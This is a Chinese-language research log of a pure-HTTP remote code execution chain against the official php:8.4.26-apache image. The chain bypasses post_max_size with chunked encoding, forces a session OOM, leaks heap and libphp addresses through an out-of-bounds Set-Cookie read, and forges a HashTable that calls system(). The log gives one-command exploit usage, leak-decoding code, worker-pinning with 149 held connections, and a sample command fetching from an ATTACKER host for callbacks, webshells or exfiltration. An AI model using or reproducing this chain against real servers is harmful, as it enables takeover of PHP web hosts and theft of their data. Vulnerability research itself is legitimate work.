# 官方 128M / display_errors=Off 纯 HTTP 进展（2026-10-22，pure/）

目标：官方 `php:8.4.26-apache`（trixie、`php.ini-production`、官方 prefork
`MaxRequestWorkers=150`、`display_errors=Off`、`memory_limit=128M`、
`output_buffering=4096`、files session handler）上的**纯 HTTP** 链：不挂
gdb、不读目标 `/proc`、不改配置。

本文只记录本轮在 `pure/` 下的独立实验，避免与 `de0/`、`tools/` 的其它
工作冲突。

## 0. 结论速览

1. **新原语：`Transfer-Encoding: chunked` 绕过 `post_max_size`。**
   不带 `Content-Length` 时 `SG(request_info).content_length = 0`，
   `rfc1867_post_handler` 的 `post_max_size` 检查被跳过；multipart 解析器
   直接读 dechunk 后的请求体。实测 10MB / 63MB body 正常解析；同样 body
   带 `Content-Length: 10MB` 时不会进入 session 初始化。
2. **纯 HTTP A1（send_cookie OOM）已复现**（`pure/mk_a1.py` +
   `pure/chunked_send.py`）：官方配置、无 gdb，响应 500，gdb 观察确认
   `php_url_encode` 入口 `fs128len=0 / free_pages=0 / rsize=limit`，
   `PS(send_cookie)=1`、`PS(id)` 悬空、`PS(mod_data)` 非空。
3. **query string 可以把 A 的 `PS(id)` / `PS(mod_data)` / basedir 移到
   page 0x56 的不同 bin-40 槽位**：每个 8 字符名的 query 参数把 md 槽位
   +2（两个 key 副本），id/basedir 页随之变化。
4. **纯 HTTP 越界读已经打通**（no gdb，3/3）：
   - A：`mk_a1.py --big 78`（默认 parts/fillers/burners/progress=4000），
     URL `/index.php?q0000000=v&...&q0000004=v`（5 个 8 字符参数），
     chunked 发送 → 500。
   - B：`mk_leak_b.py --spec "A:0x137"×24 --fake-len 0x2000 --tag`，
     chunked 发送 → **200 OK**，`Set-Cookie` 解码后 8192 字节：
     `/02BBBBB` + 8184 字节 A 时代堆残影，内含 62 个 chunk 内指针。
   - 读长度可调到 0x80000（512KB）与 0xC8000（800KB），响应 1.5–2.3MB
     仍可正常返回；指针按 2MiB 对齐聚簇，**直接给出 chunk base**。
5. **libphp 泄漏已拿到**（不再需要窗口"恰好"含 HashTable 残影）：
   在 B 里放 14 个 `G:511:0x137` 全块 forge 值、1 个 `G:400:0x137`
   （在 id 所在 chunk 的 page 0x137 处收尾）、再 1 个
   `G:511:0x137`，最后 900 个嵌套数组字段 `X:900`。G:400 的值在 id
   chunk 里留下 111 页空洞（pages 0x191..0x1ff），`X` 字段的真实
   `HashTable`/Bucket 链被 Best-Fit 放进这些洞，其
   `pDestructor = zval_ptr_dtor`。800KB 窗口里该指针出现 **1095 次**，
   于是 `libphp = 值 - 0x65EB60`。同时窗口里还有一个 2MiB 对齐的
   指针簇计数 87，聚类后正好是 **main chunk base**。
6. **纯 HTTP 全链 RCE 已打通**：根目录 `exploit.py`（`pure/pwn_pure.py`
   保留为别名）一条命令完成
   A1（OOM）→ B1（越界读，同时算 libphp + main chunk）→ A2
   （cheap-OOM）→ B2（fake-ref + 伪造 HashTable，`pDestructor=zif_system`）
   → 目标内执行 `id`。单 worker 基线 **20/20**；官方 worker
   （`MaxRequestWorkers=150`，先占住 149 个 child）**10/10**，单次约
   3–4 秒，被固定的 worker 不重启，目标仍是官方 `php.ini-production`
   (`display_errors=Off`, 128M)。

## 1. chunked 绕过 post_max_size（证据）

```
# 10MB multipart body，chunked：
python3 pure/chunked_send.py --port 18110 --body-file /tmp/body10m.bin
  -> body=10486026 resp=259 HTTP/1.1 200 OK
  gdb: SESSINIT 命中（END cleanup 执行），url_encode 132B 分配成功
# 同一 body 带 Content-Length: 10486026：
  -> 无 SESSINIT、无 session 初始化（handler 开头 return）
```

要点：`rfc1867_post_handler` 只在入口比较 `content_length`；chunked 请求
`content_length=0`。`multipart_buffer_fill` 直接调 `sapi_module.read_post`，
没有 `post_max_size` 计数。Apache 默认 `LimitRequestBody=0`。于是我们可以
发送任意大的 multipart body（>8MB）做堆整形。

## 2. 纯 HTTP A1（send_cookie OOM）

`pure/mk_a1.py` 的默认形状（= 之前 gdb 标定的 OOM 形状）：

```
PHPSESSID=\0
860 个 depth-64 嵌套空文件字段（index0: filename="A", CT=103B；
                              index1: filename="A", CT=231B；其余 filename=""）
14 个 103B 名 / 8B 值 filler（放在嵌套字段之后）
78 个 8000B 大值（放在 filler 之后）
20 个 4000B burner
PHP_SESSION_UPLOAD_PROGRESS = 'k'*4000   ← 最后一页消耗者
```

实测（官方配置、无 gdb）：HTTP 500；URL 断点
`fs128len=0 rsize=0x8000000 limit=0x8000000 fp=0`；
`PS(send_cookie)=1`、`PS(id)=chunk+0x137000`、
`PS(mod_data)=chunk+0x560a0/page 0x56 slot4`、basedir=真实字符串指针。
OOM 栈：`zend_mm_safe_error ← zend_mm_alloc_pages ← zend_mm_alloc_small_slow
← php_url_encode ← php_session_reset_id ← php_session_initialize
← php_session_rfc1867_callback`。

注意：`progress` 值同时是 smart_str key 的分配源，4000 字节用于吃掉
url_encode 前最后一页；不要随意缩短。

## 3. query string 移动 A 的 END 分配槽位

A 的 `PS(mod_data)`（40B ps_files）来自 A 末尾 `s_open` 对 bin-40
free-list head 的 ecalloc；`PS(id)`（create_sid）来自 bin-64 head。
query string 在 `_GET` 阶段（早于 `_POST`）分配 bin-40/bin-64 字符串，
因此可以平移这些 head：

| A 的 query | md 槽位（page 0x56） | id page | basedir page |
|---|---|---|---|
| 无 | slot4 | 0x137 | 0x1f3 |
| 1×`qqqqqqqq=v` | slot6 | 0x137 | 0x1f1 |
| 2× | slot8 | 0x137 | 0x1c1 |
| 3× | slot10 | 0x137 | 0x1e9 |
| 5× | slot14 | 0x137 | 0x007 |
| 2×`q…=v*48`（BIG=74） | slot8 | 0x1dc | 0x1c1 |

规律：每个 8 字符名参数（1B 值）让 md 槽位 +2；40–63B 值（bin-64）会推动
id page。`BIG` 也会影响 fs64 head（BIG 74→78 时 id page 0x1dc→0x137），
所有标定必须成对确定（query 形状 + BIG/BURN/F128）。

## 4. 为什么不能用“同地址 close”，以及可用的安全 close

### 4.1 同地址（s_open 的 ecalloc 命中 stale md）

用 gdb 把 `heap->free_slot[4]` 改成 md 后验证：`ps_close_files` 关闭的
正是刚 ecalloc 出来的新 ps_files（last_key=0、basedir=新串、fd=-1），
close 本身安全；但随后 `PS(mod_data)` 指向已释放块，`s_read` 失败触发
`php_session_abort()` 再 close 一次，造成 bin-40 双重 free：

```
WMD[1] ecalloc(md)            -> 0
WMD[2] ps_close_files frees   -> free-list next
WMD[3] zend_llist_add_element -> llist element 被分配在 md
WMD[4] php_session_abort close-> 把 list element（仍在 SG(headers) 里）free 掉
WMD[5] sapi_send_headers 再分配 md -> 覆盖 element->next/prev
...
Program received signal SIGSEGV in _efree <- zend_llist_destroy
                                    <- sapi_deactivate_module <- php_request_shutdown
```

`zend_llist_element` 是 39B（bin-40），正好落在 md；双重 free 后 free list
自环，输出阶段的默认 `Content-Type` 元素复用 md，`zend_llist_destroy`
读到被破坏的 `header` 指针（实测 rdi = ASCII `"ext/html"`）→ SIGSEGV。
因为 mod_php 在 `php_request_shutdown` **之后**才 ap_pass_brigade，响应丢失。

### 4.2 安全 close（当前采用的路径）

让 `s_open` 的 ecalloc 拿另一个槽（B 的 bin-40 head 是 page0x56 slot1），
A 的 md 落在 B 的 free-list 里但不在链首（如 slot6/slot8/slot14）：

- `last_key` = 下一个 free slot 指针（mapped）→ release 只做一次减法；
- `basedir` = 保留的 A 时代 "/tmp" 指针；
- `efree(md)` 落在 bin-40 的 SRUN 页 → 安全；
- 关键附加条件：**basedir 的 refcount 必须不是 1**，否则
  `zend_string_release_ex(basedir)` 会 efree 到一个 cached chunk 的
  FRUN 页 → `zend_mm_panic`。

我们用 501/511-page 的 flood 值把 basedir 所在 chunk 拉活并覆盖其页
（refcount 变成 0x41414141 ≠ 1），release 变成 no-op。

## 5. 已打通的纯 HTTP 越界读（no gdb，3/3）

### 5.1 A

```
python3 pure/mk_a1.py --out a.bin --big 78
python3 pure/chunked_send.py --port 18110 --body-file a.bin \
  --path "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
# -> HTTP/1.0 500
```

效果（gdb 复核，仅诊断用）：`md = main+0x56230`（page 0x56 slot14；
`main` 是 A1 的 ZendMM main chunk），id chunk 则在 `main-0x6c9000`，
`PS(id) = (id chunk)+0x137000`、`send_cookie=1`；`basedir` 在 page 0x007
（会被 flood 值覆盖）。

### 5.2 B

`pure/mk_leak_b.py` 的字段是 311-page 的 LRUN（`A` 填充），数据在
page 0x137 处结束并写入伪 `zend_string` 头：

```
data_start = chunk + 0x1000 + 0x18
id         = chunk + 0x137000
fake header at data offset 0x135FE8:
  +0x00 refcount = 0          (rshutdown release 不减到 0)
  +0x04 type     = 0x16       (IS_STRING|GC_NOT_COLLECTABLE)
  +0x08 h        = 0
  +0x10 len      = 0x2000
  +0x18 data     = "/02BBBBB" (首字节非 0；'/' 让 valid_key 失败)
L = 0x136008 -> size 0x136021 -> 311 pages (pages 1..311)
```

B 还带 `PHPSESSID=a`（1B）和 `PHP_SESSION_UPLOAD_PROGRESS=k0`；24 个
`A:0x137` 字段足以把 31 个 cached chunk 全部拉一遍，使 id chunk 与
basedir chunk 都拿到 311-page 值（id page 与 basedir page 都在
pages 1..311 内）。

```
python3 pure/mk_leak_b.py --out b.bin --spec "A:0x137,A:0x137,...,A:0x137" \
  --fake-len 0x2000 --tag
python3 pure/chunked_send.py --port 18110 --body-file b.bin --save-response b.resp
# -> HTTP/1.1 200 OK
# Set-Cookie: PHPSESSID=/02BBBBB<8184 bytes residual>
#   %2F 开头，URL 解码后长度 8200
```

结果（3/3，不同 ASLR）：

```
run1 decoded=8200 head=b'/02BBBBB\x00df...'  62 chunk 内指针, cluster=1
run2 decoded=8200 head=b'/02BBBBB\x003c...'  62 chunk 内指针, cluster=1
run3 decoded=8200 head=b'/02BBBBB\x00ea...'  62 chunk 内指针, cluster=1
```

读长度参数 `--fake-len` 可放大：
`0x80000` → 解码 524KB，7521 个指针（单一 chunk 聚簇）；
`0xC8000` → 解码 819200 字节（800KB），出现第二个 2MiB 聚簇（相邻/相关 chunk）。
`0xD0000`（越过 2MiB 边界）会 SIGSEGV（下一个 2MiB 未必映射）。
所有 0x7f… 指针按 `& ~0x1fffff` 聚簇，**取最大簇即得 id chunk base**。

### 5.3 生存链（为什么最终能 200）

1. `s_open` ecalloc 拿 slot1（不是 stale md=slot6）；
2. `ps_close_files(stale)`：last_key=slot7（free slot，减法安全）、
   basedir refcount=0x41414141（flood 覆盖，no-op）、efree(md) 在 SRUN 页；
3. `reset_id` 用伪造的 8192-len id 生成 Set-Cookie（OOB 读）；
4. `php_session_track_init`；
5. `s_read` 的 `php_session_valid_key` 因 id 数据含 '/' 返回 FAILURE →
   `php_session_abort()` 关闭的是新的、合法的 ps_files（slot1）→ 安全；
6. cleanup 里 `flush(1)` 看到 `mod_data=NULL`，跳过写/关；
7. `php_rshutdown_session_globals()` 释放 `PS(id)`：伪头 refcount=0 →
   减到 0xFFFFFFFF，不 free；
8. 脚本 `echo "OK\n"` → `php_request_shutdown` 完整跑完 →
   ap_pass_brigade 正常发出 200 + Set-Cookie。worker 不重启。

## 6. 从越界读到 RCE：纯 HTTP 全链

### 6.1 B1 的泄漏布局（LEAK_SPEC）

```
LEAK_SPEC = "G:511:0x137" * 14 + "G:400:0x137" + "G:511:0x137" + "X:900"
--fake-len 0xC8000          # 800KB，覆盖到 id chunk 的 page 0x1f7
```

- `G:<pages>:0x137`：**整块占满**的 forge 值，末尾在 page 0x137 处写伪
  `zend_string` 头（rc=0, type=0x16, len=0xC8000, data="/xxBBBBB"）。
  落在 id chunk 的 511 页值把 pages 1..511 全部占住，同时把 basedir chunk
  拉活（refcount 覆盖成 0x41…，避免 `zend_string_release` 触发
  `zend_mm_panic`）。
- `G:400:0x137`：只占 pages 1..400（伪头仍在 page 0x137），把 id chunk
  尾部 pages 0x191..0x1ff 共 **111 页**空出来；Best-Fit 随后会把 900 个
  `X` 字段的 HashTable/数组分配放进这些洞，800KB 读窗口覆盖到 page
  0x1f7，正好读到它们。
- `X:900`：每个字段 `xNNNNN[a][a]…`（12 层嵌套），值为 `v`。分配的是
  **真实 HashTable + Bucket 链**，`pDestructor` 指向 libphp 的
  `zval_ptr_dtor`，不是我们伪造的常量。

### 6.2 窗口解析（`exploit.py::parse_leak`）

`exploit.py` 默认 `--arch auto`：按泄漏窗口里重复指针的高位自动选择
x86_64（`0x7f…`）或 aarch64（`0xffff…`），显式 `--arch` 可覆盖。

800KB 解码后按 qword 扫 0x7f… 指针，按 `& ~0x1fffff`（2MiB）聚类：

```
decoded=819208
most common heap qword = 0x7fa968bdeb60   # zval_ptr_dtor
  -> libphp = 0x7fa968bdeb60 - 0x65EB60 = 0x7fa968580000
chunk buckets:
  0x7fa966200000  7495   # id 所在 chunk（窗口里主要是 chunk 内指针）
  0x7fa968a00000  1095   # zval_ptr_dtor 簇 = libphp + 0x480000
  0x7fa966800000    87   # main chunk
  0x7fa966000000    79   # 邻近 chunk
```

- `libphp`：取窗口里**出现次数最多**的非 chunk 指针，减去
  `zval_ptr_dtor=0x65EB60`。
- `main chunk`：排除 libphp 簇和计数最大的 id 簇之后，取计数最接近
  **87** 的簇。87 个指针全部落在 main chunk 的第一个 2MiB 内，所以
  簇地址就是 main chunk base。
- 合理性检查：`libphp - main` 必须在 **0x1A00000–0x1F00000** 之间
  （实测 0x1B99–0x1D80）。若不在，说明"出现最多的指针"是别的模块/
  别的世代的重复值，本次泄漏作废，重新 A1+B1（`--retries`，默认 3）。

### 6.3 Stage-3（依赖已内置到 `pure/`，纯 HTTP）

```
S    = main + 0xF8398        # 将被伪造成 zend_array 的位置
zif  = libphp + 0x465370     # zif_system
A2   = pure/cheap_oom_a.py --parts 880 --depth 64 --fillers 115
       -> hsv = main + 0x7D720（PS(hash_serialize_verifier) 指向堆）
B2   = pure/mk_ht.py S zif "id>/out/p1" ht
       pure/fake_ref_b.py --vl 384 --n1 500 --n2 495 --rc 1 \
            --ht-addr S --ht-file ht
```

`fake_ref_b.py` 用 384B 的引用计数 1 的值把 `hsv` 覆盖成指向 S 的
zval；S 处的伪造 zend_array 的 `pDestructor` 是 `zif_system`，
`nApplyCount`/`arData` 指向 `"id>/out/p1"`。请求 shutdown 时
`zend_hash_destroy` 调用 `system(cmd)`，命令输出落在 `/out/p1`。

### 6.4 实测与稳定性

```
[4/4] RCE OK; proof /home/debian/p2s-pure-1022/out/p1:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- 单 worker 基线 **20/20**：带符号调试镜像上同一 worker 连续 8 次、每次
  `--restart` 的全新容器 7 次；另外在 **stock 官方镜像
  `php:8.4.26-apache`**（未装 gdb/符号，容器内只把官方
  `php.ini-production` 复制成 `php.ini`）上复测 5/5。每次约 2 秒，
  被固定的 worker pid 不变，目标配置未改。
- 官方 worker（stock MPM：`StartServers 5`、`MaxRequestWorkers 150`）
  **10/10**：18110 上 4 次（3 次同容器 + 1 次 `--restart`），18112 上
  6 次（1 次首跑 + 3 次同容器 + 2 次 `--restart`）；每次约 3–4 秒
  （包含 149 个占位连接）。
- 加固前有 1 次失败：那一次窗口里出现最多的 qword 不是 `zval_ptr_dtor`
  （推出来的 libphp 与 main 相差 0xCB80000）。现在靠上面的 delta
  检查直接丢弃这种泄漏并重试；失败重试不会复用已被 A2 破坏的 worker
  地址，而是整条链（A1+B1）重来。
- 全链只用 HTTP（chunked multipart + 普通 GET/POST），交付路径不挂
  gdb、不读目标 `/proc`、不改目标配置。

### 6.5 从单 worker 到官方 worker（MaxRequestWorkers=150）

官方镜像的 `mpm_prefork.conf` 是 `StartServers 5`、`MaxRequestWorkers 150`；
A1/B1/A2/B2 如果落到不同 child，跨请求的悬空指针就不存在。纯 HTTP 的
解决办法是**占满其它 child，只留一个**：

```text
1. 开 MaxRequestWorkers-1 = 149 个连接，每个只发 POST 头和 1 字节 body，
   Content-Length: 1048576；prefork 会为每个连接分配一个 child 并在
   read body 处阻塞（Timeout 默认 60s，链只需要 3–4s）。
2. 剩下的唯一空闲 child 依次处理 warm GET、A1、B1、A2、B2；
   每个请求结束后它又成为唯一空闲 child，所以四步必然落在同一个进程。
3. 链结束后关闭 149 个连接，children 回到空闲状态。
```

实现：`exploit.py --workers 150`（默认值）。`--workers 1` 退回单 worker
基线，`--workers N` 用于其它 `MaxRequestWorkers` 配置。注意不要多占：
超过 N-1 个连接会排在 accept queue 里，A1 结束后它们会先抢走空闲 child，
反而把 B1 挤到别的 child。官方默认值之外的环境需要显式给 N。

## 7. 复现命令（纯 HTTP，无 gdb）

```bash
# 目标容器：stock 官方 php:8.4.26-apache + 官方 php.ini-production
./pure/run_pure.sh                     # 默认 p2s-pure-18110 / 18110
                                       # 默认官方 prefork（150 workers）
                                       # --single 单 worker；--dbg 带符号镜像

# 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> system(cmd)
# 默认 --workers 150（占住 149 个 child）；单 worker 基线用 --workers 1
python3 exploit.py --port 18110
# 期望最后两行：
# [4/4] RCE OK; proof .../out/p1:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 每次重启容器（新 ASLR）：
python3 exploit.py --port 18110 --restart p2s-pure-18110

# 自定义命令（回连、写 webshell、外带数据等）：
python3 exploit.py --port 18110 \
  --cmd 'php -r "file_get_contents(\\"http://ATTACKER/ok\\");"'
```

单独复现 A1 / 越界读：

```bash
# 1) A1：END-cleanup send_cookie OOM（带 5 个 8 字符 query 参数）
python3 pure/mk_a1.py --out /tmp/a.bin --big 78
python3 pure/chunked_send.py --port 18110 --body-file /tmp/a.bin \
  --path "/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
# 期望 HTTP/1.0 500

# 2) B：forge 值 x16 + 900 个数组字段，819KB Set-Cookie OOB 读
SPEC=$(python3 -c 'print(",".join(["G:511:0x137"]*14+["G:400:0x137","G:511:0x137","X:900"]))')
python3 pure/mk_leak_b.py --out /tmp/b.bin \
  --spec "$SPEC" --fake-len 0xC8000 --tag
python3 pure/chunked_send.py --port 18110 --body-file /tmp/b.bin \
  --timeout 300 --save-response /tmp/b.resp
# 期望 HTTP/1.1 200 OK；Set-Cookie 解码后 819208 字节
```

解码/取 chunk base 与 libphp：

```python
import urllib.parse, struct
from collections import Counter
raw=open("/tmp/b.resp","rb").read()
i=raw.find(b"Set-Cookie: PHPSESSID=")
v=raw[i+len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
dec=urllib.parse.unquote_to_bytes(v.decode("latin1"))
qs=[struct.unpack_from("<Q",dec,o)[0] for o in range(0,len(dec)-8,8)]
c=Counter(q & ~0x1fffff for q in qs if 0x7f0000000000 <= q <= 0x7fffffffffff)
print(hex(c.most_common(1)[0][0]))          # id chunk base
print(hex(Counter(qs).most_common(1)[0][0] - 0x65EB60))  # libphp
```

## 8. 文件

| 文件 | 用途 |
|---|---|
| `pure/run_pure.sh` | 起独立容器 `p2s-pure-18110`：默认 stock 官方 `php:8.4.26-apache` + 官方 `php.ini-production` + 官方 prefork（150 workers）；`--single` 单 worker；`--dbg` 带符号镜像 |
| `pure/docker/` | pure 链自己的 Docker 资产：`www/index.php`（目标页）和非官方单 worker 覆盖 `apache-single-worker.conf`；根目录 `docker/` 只保留指向这里的兼容软链 |
| `pure/chunked_send.py` | chunked 发送 multipart body（绕过 post_max_size） |
| `pure/mk_a1.py` | A1 body（OOM 形状；支持 query 由 `--path` 给） |
| `pure/mk_leak_b.py` | B body：`A:<page>` 311-page forge、`G:<pages>:<page>` 全块 forge、`F/S` flood、`X:n` 数组字段 |
| `exploit.py` | **一条命令全链**：A1 → B1（libphp+main）→ A2 → B2 → `system(cmd)`；含 delta 检查和重试（`pure/pwn_pure.py` 是它的别名） |
| `pure/cheap_oom_a.py` / `mk_ht.py` / `fake_ref_b.py` | stage-3 依赖，已从 `de0/` 内置，保证仓库自包含 |
| `pure/decode_cookie.py` | 解码响应里的 `Set-Cookie`，打印头部/聚类/指针计数 |
| `pure/mk_b_min.py` | 最小 B + 槽位整形字段（标定用） |
| `pure/mk_flood.py` | 早期 flood 生成器（保留） |
| `pure/a1_probe.gdb` / `slots4*.gdb` / `force_b.gdb` / `force_watch_b.gdb` / `check_boundary.gdb` / `read_state.gdb` | 诊断用 gdb 脚本（非交付路径） |
| `pure/RESEARCH_PURE_128M.md` | 本文 |
| 远端 `~/p2s-pure-1022/evidence/e_r1..3.resp` | 3 次 200 OK 越界读的原始响应 |
| 远端 `~/p2s-pure-1022/evidence/pwn_pure_batch_20261022.log` | 加固后 6 连击（3 同 worker + 3 全新容器）全链日志 |
| `pure/evidence/pwn_pure_official_20261022.log` | stock 官方 `php:8.4.26-apache` + 官方 `php.ini-production` 上 3 连击全链日志 |
| `pure/evidence/exploit_entry_20261022.log` | 根目录 `exploit.py` 与 `pure/pwn_pure.py` 别名各 1 次全链 |
| `pure/evidence/official_workers_20261022.log` | 官方 worker（MaxRequestWorkers=150）上 4 连击全链日志 |

## 9. 约束与免责声明

- 所有请求形状绑定官方 `php:8.4.26-apache`（trixie）构建、官方
  `php.ini-production`、官方 prefork worker（默认 `MaxRequestWorkers=150`，
  其它值用 `--workers N`）；换构建/ini 需重新标定。
- 仅用于授权环境的漏洞研究与复现。
